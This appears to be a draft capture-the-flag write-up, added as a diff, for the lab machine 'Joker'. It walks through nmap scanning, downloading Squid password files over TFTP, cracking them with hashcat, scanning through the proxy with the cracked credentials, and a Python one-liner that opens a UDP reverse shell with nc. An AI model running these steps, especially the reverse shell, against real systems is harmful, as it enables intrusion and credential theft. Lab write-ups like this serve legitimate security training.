@@ -1,0 +1,62 @@
+<h3 id="0x00--recon">0x00 : Recon</h3>
+
+<p>Important thing here is to spot UDP services<br /></p>
+<ul>
+  <li>-sC : –script=safe,intrusive</li>
+  <li>-sV : get the running version of the services</li>
+  <li>-sU : UDP scan</li>
+  <li>-sT : TCP scan</li>
+  <li>-T4 : no more than 10ms dynamic delay</li>
+  <li>-oA : output logs in all formats</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">   nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-sU</span> <span class="nt">-sT</span> <span class="nt">-T4</span> <span class="nt">-oA</span> nmap_udp.joker 10.10.10.21</code></pre></figure>
+
+<p><img src="/assets/img/joker/nmap.png" alt="joker nmap" /></p>
+
+<blockquote>
+  <p>How to know why to search into UDP ports ?</p>
+</blockquote>
+
+<p>explain ports</p>
+
+<p><br /><br /></p>
+
+<h3 id="0x01--exploitation">0x01 : Exploitation</h3>
+
+<p>Once connected to the TFTP server we have to “poke” around, in order to determine where we are.
+After a few trial and error, we can determine that the root of the TFTP server is the “/” or “root” of the box.
+According to our authorizations we can download two interesting files, related to the Squid proxy :</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">  get /etc/squid/squid.conf
+  get /etc/squid/passwords</code></pre></figure>
+
+<p>Taking a look at the password file we can identify the hash as “Apache $apr1$ MD5, md5apr1, MD5ARP” according to this <a href="https://www.dropbox.com/s/kdklrowv683yq1a/HashcatCheatSheet.v2018.1b%20%282%29.pdf?dl=0">hashcat cheatsheet</a>.
+All we have to do then is pass the hash without the username to hashcat :</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">  hashcat <span class="nt">-m</span> 1600 hash.txt rockyou.txt</code></pre></figure>
+
+<p>Now that we’ve got a username and a password, we can configure our browser with those credentials to connect to that proxy.
+Once connected, address 127.0.0.1 reveals an URL shortener kinda app.
+Before going further, let’s launch a scan in the background :</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">  dirb http://127.0.0.1:80 <span class="nt">-p</span> 10.10.10.21:3128 <span class="nt">-P</span> kalamari:ihateseafood <span class="nt">-o</span> dirb.joker.txt</code></pre></figure>
+
+<ul>
+  <li>-p : specifies the proxy address</li>
+  <li>-P : specifies the credentials for that proxy</li>
+  <li>-o : save the output to a file
+The “list” directory shows the list of previously shortned URL.
+The “console” page reveals… a python console !
+    <blockquote>
+      <p>screenshot<br />
+determine python version<br /></p>
+    </blockquote>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">  import os<span class="p">;</span>os.popen<span class="o">(</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc -u &lt;LAB IP&gt; &lt;PORT&gt; &gt;/tmp/f &amp;"</span><span class="o">)</span>.read<span class="o">()</span></code></pre></figure>
+
+<blockquote>
+  <p>python reverse shell UDP ?<br /></p>
+</blockquote>
